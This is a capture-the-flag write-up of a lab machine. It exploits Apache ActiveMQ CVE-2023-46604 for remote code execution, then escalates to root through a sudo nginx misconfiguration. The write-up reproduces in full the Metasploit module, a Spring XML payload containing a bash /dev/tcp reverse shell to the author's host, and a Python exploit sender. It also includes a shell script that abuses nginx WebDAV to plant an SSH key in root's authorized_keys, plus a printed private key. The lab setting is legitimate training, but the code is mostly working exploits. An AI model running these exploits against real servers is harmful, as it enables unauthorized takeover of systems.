```
sudo nmap -sS -sV -p- 10.10.11.243
[sudo] password for wizardwalter: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 18:06 EDT
Nmap scan report for 10.10.11.243
Host is up (0.030s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
1883/tcp  open  mqtt
5672/tcp  open  amqp?
8161/tcp  open  http       Jetty 9.4.39.v20210325
41881/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
61616/tcp open  apachemq   ActiveMQ OpenWire transport 5.15.15
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.95%I=7%D=9/6%Time=68BCB089%P=x86_64-pc-linux-gnu%r(Get
SF:Request,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\x
SF:c0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\
SF:0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20clie
SF:nt\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"AMQ
SF:P\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\
SF:0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02
SF:\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x20
SF:unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0AM
SF:QP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\
SF:x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:de
SF:code-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x20
SF:AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0
SF:\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02
SF:\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Con
SF:nection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted"
SF:)%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x
SF:02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0
SF:\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connectio
SF:n\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(DN
SF:SStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\
SF:0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18
SF:\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20fr
SF:om\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSessio
SF:nReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\
SF:x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\
SF:x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\
SF:x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie,8
SF:9,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x0
SF:4\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc
SF:0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20usi
SF:ng\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.95%I=7%D=9/6%Time=68BCB084%P=x86_64-pc-linux-gnu%r(HE
SF:LP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOMP\
SF:x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protocol
SF:Exception:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apache\
SF:.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Protoco
SF:lConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.stomp
SF:\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\ta
SF:t\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(Tra
SF:nsportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.tcp
SF:\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\.a
SF:ctivemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\n\
SF:tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

looks like on port `61616` they are running `ActiveMQ OpenWire transport 5.15.15` and looks like this version is vulnerable to :
`CVE-2023-46604`
on google i found this:
```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Retry

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache ActiveMQ Unauthenticated Remote Code Execution',
        'Description' => %q{
          This module exploits a deserialization vulnerability in the OpenWire transport unmarshaller in Apache
          ActiveMQ. Affected versions include 5.18.0 through to 5.18.2, 5.17.0 through to 5.17.5, 5.16.0 through to
          5.16.6, and all versions before 5.15.16.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'X1r0z', # Original technical analysis & exploit
          'sfewer-r7', # MSF exploit & Rapid7 analysis
        ],
        'References' => [
          ['CVE', '2023-46604'],
          ['URL', 'https://github.com/X1r0z/ActiveMQ-RCE'],
          ['URL', 'https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/'],
          ['URL', 'https://attackerkb.com/topics/IHsgZDE3tS/cve-2023-46604/rapid7-analysis'],
          ['URL', 'https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt']
        ],
        'DisclosureDate' => '2023-10-27',
        'Privileged' => false,
        'Platform' => %w[win linux unix],
        'Arch' => [ARCH_CMD],
        # The Msf::Exploit::Remote::HttpServer mixin will bring in Exploit::Remote::SocketServer, this will set the
        # Stance to passive, which is unexpected and results in the exploit running as a background job, as RunAsJob will
        # be set to true. To avoid this happening, we explicitly set the Stance to Aggressive.
        'Stance' => Stance::Aggressive,
        'Targets' => [
          [
            'Windows',
            {
              'Platform' => 'win'
            }
          ],
          [
            'Linux',
            {
              'Platform' => 'linux'
            }
          ],
          [
            'Unix',
            {
              'Platform' => 'unix'
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          # By default ActiveMQ listens for OpenWire requests on TCP port 61616.
          'RPORT' => 61616,
          # The maximum time in seconds to wait for a session.
          'WfsDelay' => 30
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def check
    connect

    res = sock.get_once

    disconnect

    return CheckCode::Unknown unless res

    len, _, magic = res.unpack('NCZ*')

    return CheckCode::Unknown unless res.length == len + 4

    return CheckCode::Unknown unless magic == 'ActiveMQ'

    return CheckCode::Detected unless res =~ /ProviderVersion...(\d+\.\d+\.\d+)/

    version = Rex::Version.new(::Regexp.last_match(1))

    ranges = [
      ['5.18.0', '5.18.2'],
      ['5.17.0', '5.17.5'],
      ['5.16.0', '5.16.6'],
      ['0.0.0', '5.15.15']
    ]

    ranges.each do |min, max|
      if version.between?(Rex::Version.new(min), Rex::Version.new(max))
        return Exploit::CheckCode::Appears("Apache ActiveMQ #{version}")
      end
    end

    Exploit::CheckCode::Safe("Apache ActiveMQ #{version}")
  end

  def exploit
    # The payload is send in a CDATA section of an XML file. Therefore, the payload cannot contain a CDATA closing tag.
    if payload.encoded.include? ']]>'
      fail_with(Failure::BadConfig, 'The encoded payload data may not contain the CDATA closing tag ]]>')
    end

    start_service

    connect

    # The vulnerability allows us to instantiate an arbitrary class, with a single arbitrary string parameter. To
    # leverage this we can use ClassPathXmlApplicationContext, and pass a URL to an XML configuration file we
    # serve. This XML file allows us to create arbitrary classes, and call arbitrary methods. This is leveraged to
    # run an attacker supplied command line via java.lang.ProcessBuilder.start.
    clazz = 'org.springframework.context.support.ClassPathXmlApplicationContext'

    # 31 is the EXCEPTION_RESPONSE data type.
    data = [31].pack('C')
    # ResponseMarshaller.looseUnmarshal reads a 4 byte int for the command id.
    data << [0].pack('N')
    # and a 1 byte boolean for response required.
    data << [0].pack('C')
    # ResponseMarshaller.looseUnmarshal read a 4 byte int for the correlation ID.
    data << [0].pack('N')
    # BaseDataStreamMarshaller.looseUnmarsalThrowable wants a boolean true to continue to unmarshall.
    data << [1].pack('C')
    # BaseDataStreamMarshaller.looseUnmarshalString reads a byte boolean and if true, reads a UTF-8 string.
    data << [1].pack('C')
    # First 2 bytes are the length.
    data << [clazz.length].pack('n')
    # Then the string data. This is the class name to instantiate.
    data << clazz
    # Same again for the method string. This is the single string parameter used during class instantiation.
    data << [1].pack('C')
    data << [get_uri.length].pack('n')
    data << get_uri

    sock.puts([data.length].pack('N') + data)

    retry_until_truthy(timeout: datastore['WfsDelay']) do
      !handler_enabled? || session_created?
    end

    handler
  ensure
    cleanup
  end

  def on_request_uri(cli, request)
    if request.uri != get_resource
      super
    end

    case target['Platform']
    when 'win'
      shell = 'cmd.exe'
      flag = '/c'
    when 'linux', 'unix'
      shell = '/bin/sh'
      flag = '-c'
    end

    xml = %(<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="#{Rex::Text.rand_text_alpha(8)}" class="java.lang.ProcessBuilder" init-method="start">
  <constructor-arg>
    <list>
      <value>#{shell}</value>
      <value>#{flag}</value>
      <value><![CDATA[#{payload.encoded}]]></value>
    </list>
  </constructor-arg>
</bean>
</beans>)

    send_response(cli, xml, {
      'Content-Type' => 'application/xml',
      'Connection' => 'close',
      'Pragma' => 'no-cache'
    })

    print_status('Sent ClassPathXmlApplicationContext configuration file.')
  end

end
```
looks like we send an xml file that gives us unauthorized RCE....

though this is for metasploit i will find one that i can use with just python....

ok i found this from https://github.com/rootsecdev/CVE-2023-46604/blob/main/poc-linux.xml
```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <!-- This command will give a reverse shell on port 9001. HTML Entity Encoded. Change IP as needed -->
            <value>bash -i &#x3E;&#x26; /dev/tcp/10.10.14.4/9001 0&#x3E;&#x26;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

i will host this file and run:
```
import socket 
import argparse 
 
def main(ip, port, url): 
    if not ip or not url: 
        print("Usage: script.py -i <ip> -p <port> -u <url>") 
        return 
     
    banner() 
     
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext" 
    message = url 
 
    header = "1f00000000000000000001" 
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message) 
    payload = int2hex(len(body) // 2, 8) + body 
    data = bytes.fromhex(payload) 
 
    print("[*] Target:", f"{ip}:{port}") 
    print("[*] XML URL:", url) 
    print() 
    print("[*] Sending packet:", payload) 
 
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    conn.connect((ip, int(port))) 
    conn.send(data) 
    conn.close() 
 
def banner(): 
    print("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n") 
 
def string2hex(s): 
    return s.encode().hex() 
 
def int2hex(i, n): 
    if n == 4: 
        return format(i, '04x') 
    elif n == 8: 
        return format(i, '08x') 
    else: 
        raise ValueError("n must be 4 or 8") 
 
if __name__ == "__main__": 
    parser = argparse.ArgumentParser() 
    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Host") 
    parser.add_argument("-p", "--port", default="61616", help="ActiveMQ Server Port") 
    parser.add_argument("-u", "--url", help="Spring XML Url") 
    args = parser.parse_args() 
     
    main(args.ip, args.port, args.url)
```

lets make these files and run them and see what we get...
ill create exploit.xml and exploit.py... ill start my python server as well as my nc listener on 9001...
```
python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.4/exploit.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.14.4/exploit.xml

[*] Sending packet: 000000701f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001d687474703a2f2f31302e31302e31342e342f6578706c6f69742e786d6c
```

worked and i caught the shell!
```
nc -lvnp 9001               
listening on [any] 9001 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.243] 45790
bash: cannot set terminal process group (904): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

alright!

ill cd ~

and user.txt is right there:
```
cat user.txt
5621bb13e5fea8b**************
```

User PWN!

---

### Priv Esc

lets run` sudo -l`
```
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

lets go check this out...
```
sudo nginx
nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Unknown error)
nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Unknown error)
nginx: [emerg] still could not bind()
```

confirm this works and does not ask for a password at all...

i just googled and found this shell script:https://github.com/DylanGrl/nginx_sudo_privesc/blob/main/exploit.sh
```
#!/bin/sh
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;
	        root /;
	        autoindex on;
	        dav_methods PUT;
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

lets use it!

ill create a file called gen_key.sh with the above code and upload with wget and hosting the file again on my python server, note make sure to run chmod +x on file so we can run:

```
./gen_key.sh
[+] Creating configuration...
[+] Loading configuration...
[+] Generating SSH Key...
Generating public/private rsa key pair.
Enter file in which to save the key (/home/activemq/.ssh/id_rsa): 
Created directory '/home/activemq/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/activemq/.ssh/id_rsa
Your public key has been saved in /home/activemq/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:rlypwYDcLSDw2E3+iwEP8I/DLCp5YJGx95pZmQ4mFsk activemq@broker
The key's randomart image is:
+---[RSA 3072]----+
|o.  .            |
|o*=+             |
|oEB.o            |
| =+X.oo          |
|o+BoB=o S        |
|++o.B* o .       |
|+ .+..+ +        |
|..   . =         |
|      +          |
+----[SHA256]-----+
[+] Display SSH Private Key for copy...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsjufWA/zzaKBDXu0OwqM4m/Gj1iIm8NTkUYDInh6pxXBRYZ/OTsA
UkCNUZ1PwgRE44Z8JX8oe9oLW7vF9pVUJd4n7V95eiitfeixYgRnCClZy5mhPcoxaUw0pq
yf5Qd7WlFNFWMaannZpnFDdghaHbHRb6mQzjRF78cFUaRKvjIOH5+04NmcpGkHT317a9dB
JuC8pTrA1QlKFCzw5jwMTaEPZaP6zsuSABustamkLrf3g6pAaWwxoxna7EPLi3VNiaMU66
BzQ61znz8Taaoqw1UoDkrFAb+ZrSQNuFaMSVCFioS/B9wLV7rbBTEN/MDLVsoTFOr8aw3T
POwXECkatWNZHHrACSKTKnDXZhVDt3XtZ0AZHdFbOZNiVkuZWzk5A+U1VTalBqogNdymkG
ffn3ctAESJeCk38fbuweajZTmAt5IMs3BsIZxrAe9u43d2LBVy7WZ7Zs+sPRoXB3mqNAt7
InTuF+CnuCdCdkYsel8i7WVMUkrUbfZrqkflr1QHAAAFiKEsD++hLA/vAAAAB3NzaC1yc2
EAAAGBALI7n1gP882igQ17tDsKjOJvxo9YiJvDU5FGAyJ4eqcVwUWGfzk7AFJAjVGdT8IE
ROOGfCV/KHvaC1u7xfaVVCXeJ+1feXoorX3osWIEZwgpWcuZoT3KMWlMNKasn+UHe1pRTR
VjGmp52aZxQ3YIWh2x0W+pkM40Re/HBVGkSr4yDh+ftODZnKRpB099e2vXQSbgvKU6wNUJ
ShQs8OY8DE2hD2Wj+s7LkgAbrLWppC6394OqQGlsMaMZ2uxDy4t1TYmjFOugc0Otc58/E2
mqKsNVKA5KxQG/ma0kDbhWjElQhYqEvwfcC1e62wUxDfzAy1bKExTq/GsN0zzsFxApGrVj
WRx6wAkikypw12YVQ7d17WdAGR3RWzmTYlZLmVs5OQPlNVU2pQaqIDXcppBn3593LQBEiX
gpN/H27sHmo2U5gLeSDLNwbCGcawHvbuN3diwVcu1me2bPrD0aFwd5qjQLeyJ07hfgp7gn
QnZGLHpfIu1lTFJK1G32a6pH5a9UBwAAAAMBAAEAAAGACuGK89RdfQNbv5f6w9P8D+LlC2
FLTb8Z/fd5P4R9cG/qkbUJVVQdy+e2+PGSqfSaxA00zRE7RnxkTyBikJBDR+CNLXezsdqD
5Pjsw2AjbiMgIUbqyhvq8lO9ryNAy7muNTBbdV/MgA2aVQf7J1yRK9jsQVXnyj70uhO7Zm
WSTpQ9un6Ei2mdn4ft81Nk0oucpaP4wFma5iagCCVKO7QUyDR5/SmKqU9SRYFrBNgrdtKy
YK5nKkh5q0xryhrFdWkezZ4bhsMWSJyqO8DFIkBKWCgSI20rF/AdBRXUkgrEUPOufMfQdb
S+yrEB61AxRXouuBa6V/JUzbUvycxu9xhJynadJnkBx4SuOGYbFq+kkZiQMsfxfukxJ2Y1
UtgqyL0jh/vB8U3FeG6ef3ZVGHvfeQsdasils0t5gb7c+zpIkGHGH1ivWlxV70AIGFOtr1
nLOjxU8rjk9olVxQUFqGO/D3lSLIwHzQD3tsh+VwDdLhA6i0BPlkRSfxwMIN1w/LGpAAAA
wQDXJROcCpheO5woA/rpnRANcLyeooqrsz/Vt7WQxIO6eEL1+sVRXabpF+qjJvJerP1BhV
TjLDeyp+5VUum8dv3BzvOYNx/3Vphq49uHKCvfSk/iLa2i2sXKwFLqXtCKri50oXcynrH0
0IPM9ZwQh/9gkU8Irx4Tb6TESbNdeY+7DE9bbX7jpQ53tlU90OmvZfim6MVAw7UcW5aABq
EILDbqts5PAMU7QMeIWTkTD7fEEPEjyEwOfR+o5lJbakvBORwAAADBANtW49yL1Vt5JrRr
8VTLYLpnQmzLWg6ckoYLHmmyEqDDnP5Y01j0sAH4egdpGBpQ/olchepCL8Qpl6cfOhRoot
xEcW7BoOqJK8WpyBGMPrqGl61oQAqUE8817TQ2vSf1J6m0v30R+dKbWqnXf0EeqIQm3HWu
7yYyI/iTyEi62DgSz1rGGCJ60fhjh9a63UaVLOf3lrw5TObSOXgDGsrxmfR9nkQcCgwXap
K8vCzonKw83Kb8knCEp0tFW1GRSXPa5QAAAMEA0AXdLylH3il/PvamyHI79jgp3rX2ffgI
jDOjXcj8tzPxSKYtvtKYF4QE9jlNf++xBBsMYz32TZILqX498wimQJ72Mos6mVrogiAYLF
7WdNUdVYHV8wLr4WqHLFn8lQnTN0yumB0RsVUolsfB18QRO8et5oZ4u3aswP5kmJH9TBkI
LltMejN0sWHhCMvj5PaYmrcXDc2sdPc459ivfkf8l1DYNMbLBq6junxN4oe3KPcL5BMwmW
n9kVlj+q8ylgh7AAAAD2FjdGl2ZW1xQGJyb2tlcgECAw==
-----END OPENSSH PRIVATE KEY-----
[+] Add key to root user...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   568    0     0  100   568      0  19770 --:--:-- --:--:-- --:--:-- 20285
[+] Use the SSH key to get access
```

Nice i should be able to save that priv key and use it to ssh into the box and since this was ran as root, it should be a root shell !
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
once we make this file `root_ssh_key`

need to make sure to run the following:
`chmod 600 root_ssh_key`

`chown wizardwalter:wizardwalter root_ssh_key`

finally:
```
ssh -o IdentitiesOnly=yes -i root_ssh_key root@10.10.11.243
....

root@broker:~# cat root.txt
60edf2200e9a92********
```

root PWNED!
